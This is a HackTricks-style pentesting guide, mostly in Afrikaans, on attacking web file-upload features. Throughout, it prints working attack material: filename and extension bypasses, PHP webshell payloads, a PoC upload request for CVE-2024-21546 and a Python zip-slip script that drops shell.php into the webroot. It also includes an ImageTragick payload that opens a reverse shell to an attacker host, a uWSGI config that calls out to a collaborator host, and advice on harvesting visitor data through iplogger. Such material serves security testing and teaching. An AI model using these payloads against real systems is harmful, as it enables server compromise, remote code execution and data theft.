# Lêer-oplaai

{{#include ../../banners/hacktricks-training.md}}

## Algemene metodologie vir lêer-oplaai

Ander nuttige extensies:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Omseil kontroles op lêer-ekstensies

1. Indien van toepassing, **kontroleer** die **vorige extensies.** Toets dit ook met sommige **hoofletters**: _pHp, .pHP5, .PhAr ..._
2. _Toets om **'n geldige extensie vóór** die uitvoerings-extensie te voeg (gebruik ook vorige extensies):_
- _file.png.php_
- _file.png.Php5_
3. Probeer om **spesiale karakters aan die einde toe te voeg.** Jy kan Burp gebruik om **bruteforce** al die **ascii** en **Unicode** karakters. (_Let wel dat jy ook kan probeer om die **vroeggenoemde** **extensies** te gebruik_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Probeer om die beskermings te omseil deur die bediener se **extension parser** te mislei met tegnieke soos **doubling** die **extension** of **adding junk** data (**null** bytes) tussen extensies. _Jy kan ook die **vorige extensies** gebruik om 'n beter payload voor te berei._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Voeg **nog 'n laag van extensies** by by die vorige toets:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Probeer om die **exec extension voor die geldige extensie** te plaas en hoop die bediener is verkeerd gekonfigureer. (nuttig om Apache-misconfigurasies uit te buit waar enigiets met die ekstensie **.php**, maar nie noodwendig eindigend op .php nie, kode sal uitvoer):
- _ex: file.php.png_
7. Gebruik van **NTFS alternate data stream (ADS)** in **Windows**. In hierdie geval sal 'n kolonkarakter ":" ingevoeg word ná 'n verbode extensie en voor 'n toegelate een. As gevolg daarvan sal 'n **leë lêer met die verbode extensie** op die bediener geskep word (bv. "file.asax:.jpg"). Hierdie lêer kan later deur ander tegnieke gewysig word, soos deur sy short filename te gebruik. Die "**::$data**" patroon kan ook gebruik word om nie-leë lêers te skep. Dus kan die byvoeging van 'n puntkarakter na hierdie patroon ook nuttig wees om verdere beperkings te omseil (bv. "file.asp::$data.")
8. Probeer om die lêernaamlimiete te breek. Die geldige extensie word afgesny. En die kwaadwillige PHP bly oor. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Party upload handlers sny of normaliseer agtergestelde puntkarakters uit die gestoor lêernaam. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) weergawes voor 2.9.1, kan jy extensie-validering omseil deur:

- Gebruik 'n geldige image MIME en magic header (bv. PNG se `\x89PNG\r\n\x1a\n`).
- Noem die oplaai-lêer met 'n PHP-extensie gevolg deur 'n punt, bv. `shell.php.`.
- Die bediener verwyder die agterste punt en stoor `shell.php`, wat sal uitvoer as dit in 'n web-bedienende gids geplaas word (standaard publieke stoor soos `/storage/files/`).

Minimale PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Roep dan die gestoorde pad aan (tipies in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Versagtingsmaatreëls:
- Opgradeer unisharp/laravel-filemanager na ≥ 2.9.1.
- Dwing streng server-side allowlists af en hervalideer die gestoorde lêernaam.
- Bedien uploads vanaf nie-uitvoerbare plekke.

### Omseil Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- If **compressions is being added to your image**, for example using some standard PHP libraries like [PHP-GD](https://www.php.net/manual/fr/book.image.php), the previous techniques won't be useful it. However, you could use the **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- The web page cold also be **resizing** the **image**, using for example the PHP-GD functions `imagecopyresized` or `imagecopyresampled`. However, you could use the **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Another technique to make a payload that **survives an image resizing**, using the PHP-GD function `thumbnailImage`. However, you could use the **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Ander truuks om te kontroleer

- Vind 'n kwesbaarheid om die reeds opgelaaide lêer te **hernoem** (om die uitbreiding te verander).
- Vind 'n **Local File Inclusion** kwetsbaarheid om die backdoor uit te voer.
- **Moontlike inligtingsvrystelling**:
1. Laai **veral kere** op (en op die **selfde tyd**) dieselfde **lêer** met dieselfde **naam**
2. Laai 'n lêer op met die **naam** van 'n **lêer** of **gids** wat **reeds bestaan**
3. Laai 'n lêer op met **"." , "..", or "…" as its name**. Byvoorbeeld, in Apache op **Windows**, as die toepassing die opgelaaide lêers stoor in "/www/uploads/" directory, sal die "." filename 'n lêer met die naam "uploads" in die "/www/" directory skep.
4. Laai 'n lêer op wat nie maklik verwyder kan word nie, soos **"…:.jpg"** in **NTFS**. (Windows)
5. Laai 'n lêer op in **Windows** met **ongeldige karakters** soos `|<>*?”` in die naam. (Windows)
6. Laai 'n lêer op in **Windows** met **gereserveerde** (**verbode**) **name** soos CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, en LPT9.
- Probeer ook om 'n **uitvoerbare lêer op te laai** (.exe) of 'n **.html** (minder verdenk) wat **kode sal uitvoer** wanneer dit per ongeluk deur die slagoffer oopgemaak word.

### Spesiale uitbreidingstruuks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar` lêers is soos die `.jar` vir java, maar vir php, en kan **soos 'n php-lêer gebruik word** (uitvoer met php, of insluit in 'n script...)

Die `.inc` uitbreiding word soms gebruik vir php lêers wat slegs gebruik word om **lêers te importeer**, so, op 'n stadium, kan iemand hierdie uitbreiding toegelaat het om **uitgevoer te word**.

## **Jetty RCE**

As jy 'n XML-lêer na 'n Jetty-server kan oplaai, kan jy [RCE kry omdat **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** So, soos in die volgende prent getoon, laai die XML-lêer op na `$JETTY_BASE/webapps/` en verwag die shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) kwesbaarhede kan uitgebuit word in uWSGI-bedieners indien iemand die vermoë het om die `.ini` konfigurasielêer te wysig. uWSGI konfigurasielêers gebruik 'n spesifieke sintaks om "magic" veranderlikes, plaasvervangers en operateurs in te sluit. Noemenswaardig is die '@' operateur, wat as `@(filename)` gebruik word en ontwerp is om die inhoud van 'n lêer in te sluit. Onder die verskeie ondersteunde skemas in uWSGI is die "exec" skema besonders kragtig, aangesien dit die lees van data vanaf 'n proses se standaarduitset toelaat. Hierdie funksie kan gemanipuleer word vir kwaadwillige doeleindes soos Remote Command Execution of Arbitrary File Write/Read wanneer 'n `.ini` konfigurasielêer verwerk word.

Oorweeg die volgende voorbeeld van 'n skadelike `uwsgi.ini` lêer, wat verskeie skemas demonstreer:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die uitvoering van die payload gebeur tydens die parsing van die konfigurasielêer. Om die konfigurasie geaktiveer en geparse te kry, moet die uWSGI-proses óf herbegin word (moontlik ná 'n crash of as gevolg van 'n Denial of Service-aanval) óf die lêer moet ingestel wees om auto-reload. Die auto-reload feature, indien geaktiveer, herlaai die lêer op gespesifiseerde intervalle wanneer veranderinge opgespoor word.

Dit is belangrik om die losse aard van uWSGI se konfigurasielêer-parsing te verstaan. Spesifiek kan die bespreekte payload in 'n binêre lêer (soos 'n beeld of PDF) ingevoeg word, wat die omvang van moontlike uitbuiting verder vergroot.

## **wget File Upload/SSRF Trick**

In sommige gevalle mag jy vind dat 'n server **`wget`** gebruik om **download files** en jy kan die **URL** aandui. In sulke gevalle mag die kode nagaan dat die extension van die gedownloade files in 'n whitelist is om te verseker dat slegs toegelate files afgelaai gaan word. However, **this check can be bypassed.**\
Die **maximum** lengte van 'n **filename** in **linux** is **255**, egter **wget** kort die filenames af tot **236** karakters. Jy kan 'n file download met die naam "A"\*232+".php"+".gif" — hierdie filename sal die check omseil (soos in hierdie voorbeeld is ".gif" 'n geldige extension) maar `wget` sal die file hernoem na "A"\*232+".php".
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Let daarop dat **'n ander opsie** waaraan jy dalk dink om hierdie kontrole te omseil is om die **HTTP server te laat herlei na 'n ander lêer**, sodat die aanvanklike URL die kontrole sal omseil maar dan sal wget die herlei lêer met die nuwe naam aflaai. Dit **gaan nie werk nie** **tensy** wget gebruik word met die **parameter** `--trust-server-names` omdat **wget die herlei bladsy sal aflaai met die naam van die lêer aangedui in die oorspronklike URL**.

## Gereedskap

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is 'n kragtige hulpmiddel ontwerp om Pentesters en Bug Hunters te help met die toets van file upload mechanisms. Dit maak gebruik van verskeie bug bounty techniques om die proses van die identifisering en uitbuiting van vulnerabilities te vereenvoudig en sorg vir deeglike assesserings van web applications.

### Corrupting upload indices with snprintf quirks (historical)

Sommige legacy upload handlers wat snprintf() of soortgelyke funksies gebruik om multi-file arrays uit 'n single-file upload te bou, kan mislei word om die _FILES struktuur te vervals. As gevolg van inkonsekwenthede en afkap in snprintf() gedrag, kan 'n sorgvuldig saamgestelde enkele upload op die bediener-kant as verskeie geïndekseerde lêers voorkom, wat logika verwar wat 'n streng struktuur aanvaar (bv. dit as 'n multi-file upload behandel en onveilige takke neem). Al is dit vandag nissies, duik hierdie “index corruption” patroon soms weer op in CTFs en ouer codebases.

## From File upload to other vulnerabilities

- Stel **filename** op `../../../tmp/lol.png` en probeer 'n **path traversal** bereik
- Stel **filename** op `sleep(10)-- -.jpg` en jy kan moontlik 'n **SQL injection** bereik
- Stel **filename** op `<svg onload=alert(document.domain)>` om 'n **XSS** te bewerkstellig
- Stel **filename** op `; sleep 10;` om sekere **command injection** te toets (meer [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Probeer **verskeie svg payloads** vanaf [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- As jy die **web server kan aanwys om 'n image vanaf 'n URL te haal** kan jy probeer om 'n [SSRF](../ssrf-server-side-request-forgery/index.html) te misbruik. As hierdie **image** in 'n **public** site **gesave** gaan word, kan jy ook 'n URL van [https://iplogger.org/invisible/](https://iplogger.org/invisible/) aandui en die **inligting van elke besoeker steel**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Spesiaal saamgestelde PDFs vir XSS: Die volgende bladsy verduidelik hoe om **PDF data te injecteer om JS uitvoering te bekom** (../xss-cross-site-scripting/pdf-injection.md). As jy PDFs kan upload, kan jy 'n PDF voorberei wat arbitêre JS sal uitvoer volgens die gegewe aanwijgings.
- Upload die \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) inhoud om te kontroleer of die bediener enige **antivirus** het
- Kontroleer of daar enige **grootte beperking** is wanneer jy files upload

Hier is 'n top 10 lys van dinge wat jy deur opgelaai te word kan bereik (van [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magiese Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Verwys na [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) vir ander filetypes.

## Zip/Tar File Automatically decompressed Upload

As jy 'n ZIP kan upload wat binne die bediener gedecomprimeer gaan word, kan jy twee dinge doen:

### Symlink

Upload 'n arkief wat soft links na ander files bevat, dan, deur toegang te kry tot die gedecomprimeerde files, sal jy toegang kry tot die gelinkte files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekomprimeer in verskillende vouers

Die onvoorsiene skepping van lêers in gidse tydens dekompressie is 'n beduidende probleem. Ten spyte van aanvanklike veronderstellings dat hierdie opstelling teen OS-level command execution deur kwaadwillige lêer-oplaaie sou beskerm, kan die hiërargiese kompressie-ondersteuning en directory traversal vermoëns van die ZIP archive format uitgebuit word. Dit stel aanvallers in staat om beperkings te omseil en uit veilige oplaai-gidse te ontsnap deur die dekompressie-funksionaliteit van die geteikende toepassing te manipuleer.

'n Outomatiese exploit om sulke lêers te skep is beskikbaar by [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Die nutsprogram kan soos volg gebruik word:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Verder is die **symlink trick with evilarc** ’n opsie. As die doelwit is om ’n lêer soos `/flag.txt` te mik, moet ’n symlink na daardie lêer in jou stelsel geskep word. Dit verseker dat evilarc tydens sy werking nie foutmeldings ervaar nie.

Hieronder is ’n voorbeeld van Python-kode wat gebruik word om ’n kwaadwillige zip-lêer te skep:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Misbruik van kompressie vir file spraying**

Vir meer besonderhede **kyk na die oorspronklike pos by**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP-kode word geskryf om opdragte uit te voer wat deur die `$_REQUEST` veranderlike oorgedra word.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Verskeie lêers word geskep en 'n zip-argief word saamgestel wat hierdie lêers bevat.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Die name van die lêers binne die zip word met vi of 'n hex editor verander, deur "xxA" na "../" te verander om deur gidse te navigeer.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Laai hierdie inhoud op met 'n beeldlêer-uitbreiding om die kwesbaarheid uit te buit **(ImageMagick , 7.0.1-1)** (sien die [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

Die insluiting van 'n PHP shell in die IDAT chunk van 'n PNG-lêer kan sekere image processing-operasies effektief omseil. Die funksies `imagecopyresized` en `imagecopyresampled` van PHP-GD is in hierdie verband besonder relevant, aangesien hulle algemeen gebruik word vir die resizing en resampling van beelde, onderskeidelik. Die vermoë van die ingeslote PHP shell om onaangetas te bly deur hierdie operasies is 'n betekenisvolle voordeel vir sekere gebruiksgevalle.

'n Gedetaileerde ondersoek van hierdie tegniek, insluitend metodologie en potensiële toepassings, word verskaf in die volgende artikel: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Hierdie bron bied 'n omvattende begrip van die proses en die implikasies daarvan.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot-lêers

Polyglot-lêers funksioneer as kameleonne in cybersecurity, en kan geldig in meervoudige lêerformate gelyktydig bestaan. 'n Interessante voorbeeld is 'n [GIFAR](https://en.wikipedia.org/wiki/Gifar), 'n hibriede wat beide as 'n GIF en 'n RAR-argief funksioneer. Sulke lêers is nie beperk tot daardie kombinasie nie; kombinasies soos GIF en JS of PPT en JS is ook haalbaar.

Die kernnut van polyglot-lêers lê in hul vermoë om sekuriteitsmaatreëls te omseil wat lêers op grond van tipe sifts. Algemene praktyk in verskeie toepassings behels slegs sekere lêertipes toe te laat vir upload—soos JPEG, GIF of DOC—om die risiko van potensieel skadelike formate (bv. JS, PHP, of Phar-lêers) te verminder. 'n Polyglot kan egter deur die strukturele kriteria van veelvuldige lêertipes te voldoen, stilweg hierdie beperkings omseil.

Ten spyte van hul aanpasbaarheid, het polyglots wel beperkings. Byvoorbeeld, al kan 'n polyglot terselfdertyd 'n PHAR-lêer en 'n JPEG beliggaam, mag die sukses van sy upload afhanklik wees van die platform se file extension-beleid. As die stelsel streng is oor toegelate extensies, mag die strukturele dualiteit van 'n polyglot nie voldoende wees om sy upload te waarborg nie.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Hoe om file type-deteksering te vermy deur 'n geldige JSON-lêer op te laai selfs al is dit nie toegelaat nie deur 'n vals PDF-lêer na te boots (tegnieke uit **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Solank die `%PDF` magic bytes in die eerste 1024 bytes is, is dit geldig (kry voorbeeld in die post)
- **`pdflib` library**: Voeg 'n vals PDF-formaat binne 'n veld van die JSON in sodat die library dink dit is 'n pdf (kry voorbeeld in die post)
- **`file` binary**: Dit kan tot 1048576 bytes van 'n lêer lees. Skep eenvoudig 'n JSON wat groter is as dit sodat dit nie die inhoud as 'n json kan parse nie, en plaas dan binne die JSON die aanvanklike deel van 'n werklike PDF en dit sal dink dit is 'n PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
